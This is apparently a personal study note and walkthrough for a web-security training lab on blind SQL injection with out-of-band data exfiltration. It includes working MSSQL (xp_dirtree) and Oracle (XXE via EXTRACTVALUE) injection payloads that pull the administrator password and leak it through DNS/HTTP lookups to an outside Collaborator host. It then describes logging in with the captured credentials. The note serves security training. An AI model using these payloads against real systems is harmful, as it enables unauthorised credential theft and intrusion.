
Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application.
```sql
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
- This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup.

**This will result in a DNS lookup like the following, allowing you to view the captured password:**
```sql
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

- Out-of-band ([[Out-of-band application security testing (OAST)]] techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel.
- For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

**For more info** --> [[SQL injection cheat sheet]]
## Steps to solve lab
### Desc - Blind SQL injection with out-of-band data exfiltration
**Our end goal** - To solve the lab, log in as the `administrator` user.

1. First send the `/` to Burp Repeater and analyse the `TrackingId`.
![[Blind_SQL_injection_with_out-of-band_data_exfiltration2.png]]

2. Now, place the below command with `TrackingId`.
**Command** - 
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.qoiia0mwf6mzqw3fsx5cplgw1n7ev6jv.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

**In burp** - 
![[Blind_SQL_injection_with_out-of-band_data_exfiltration3.png]]
Make sure before sending this you need to url encode it with `Ctrl + U`.

3. Now, navigate to Collaborator tab and click on poll now.
![[Blind_SQL_injection_with_out-of-band_data_exfiltration4.png]]

4. Now, login with these credentials. 
![[Blind_SQL_injection_with_out-of-band_data_exfiltration1.png]]